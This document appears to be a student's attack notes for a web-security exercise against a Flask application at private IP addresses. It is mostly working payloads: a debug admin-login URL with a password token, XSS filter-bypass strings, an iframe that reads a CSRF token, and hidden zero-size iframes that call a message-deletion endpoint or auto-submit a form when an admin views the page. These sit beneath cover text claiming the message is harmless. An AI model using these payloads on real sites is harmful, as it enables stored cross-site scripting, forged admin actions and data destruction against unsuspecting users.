# Web-Attack
 
*** Debug login as admin ***

https://172.21.73.116:5000/login?password=c90fcd9b2c5b3000299db8c12c3d2157



*** Certificate ***

https://blog.miguelgrinberg.com/post/running-your-flask-application-over-https



*** Find XSS Pathway ***

<script>alert('XSS')</script>
<scri<script>pt>alert('XSS')</scri<script>pt>
<img src="fakePath" onerror="javascript:alert('XSS');">
<img src="javascript:alert('XSS');"></img>
<iframe src="javascript:alert('XSS');"></iframe>



*** Publish Message as Administrator ***

<iframe src="javascript:alert(window.parent.document.getElementById('csrf_token').value);"></iframe>
<iframe src="https://172.21.70.152:5000/drop_all_messages"></iframe>

<iframe width="0" height="0" style="opacity: 0;" src="javascript:const f = window.parent.document; var tags = f.getElementsByTagName('p'); var isAdmin = 1; for (const t of tags) { if (t.innerHTML === 'אתה מחובר כמשתמש חלש!') { isAdmin = 0; } }; if (isAdmin == 1) { var headers3 = f.getElementsByTagName('h3'); var wasPublished = 0; for (const h3 of headers3) { if (h3.innerHTML === 'Mail: attacker@xss.com') { wasPublished = 1; } }; if (wasPublished == 0) { f.getElementsByName('name')[0].value = 'Attacker'; f.getElementsByName('email')[0].value = 'attacker@xss.com'; f.getElementsByName('subject')[0].value = 'Attacking'; f.getElementsByName('phone_number')[0].value = '052911911'; f.getElementsByName('message')[0].value = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Suspendisse sodales pellentesque neque, gravida semper turpis hendrerit in. Interdum et malesuada fames ac ante ipsum primis in faucibus. Vestibulum sit amet leo eu justo fermentum malesuada. Mauris condimentum metus mi, ut bibendum orci pellentesque et. Cras fermentum purus eu enim rutrum gravida. Vivamus varius maximus enim. Ut dapibus at dolor ac pretium. Curabitur vel justo nisl. Duis ac iaculis metus. Curabitur a facilisis neque. Vestibulum bibendum dignissim quam, vel dictum ipsum gravida eget. Phasellus quis maximus purus. Nam semper aliquam velit. Duis quis nisi at turpis viverra dignissim.';  f.getElementsByName('contact-form')[0].submit(); }};"></iframe>
Just an ordinary legitimate message :)




<object type="text/x-scriptlet" data="javascript:alert(XSS);">


<iframe width="0" height="0" style="opacity: 0;" src="https://172.21.73.116:5000/drop_all_messages/"></iframe>
This message is definitely not malicious :)





